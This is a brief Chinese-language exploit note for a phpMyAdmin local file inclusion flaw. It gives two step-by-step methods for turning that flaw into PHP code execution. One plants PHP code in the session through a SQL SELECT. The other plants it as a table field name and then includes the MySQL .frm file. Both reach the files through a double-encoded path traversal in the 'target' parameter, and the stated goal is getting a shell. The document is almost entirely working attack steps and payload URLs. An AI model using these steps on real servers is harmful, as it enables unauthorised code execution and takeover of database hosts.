## 本地session包含
1. root登录，执行 `select '<?php phpinfo();exit;?>'`
2. 找到phpmyadmin cookie，`/index.php?target=db_sql.php%253f/../../var/lib/php/sessions/<you cookie>`

## 写入sql文件getishell
1. test数据库下新建表，字段名`<?php phpinfo()?>`
2. 查看sql文件路径`show variables like '%datadir%'`
3. getshll `/index.php?target=db_sql.php%253f/../../var/lib/mysql/test/hy.frm`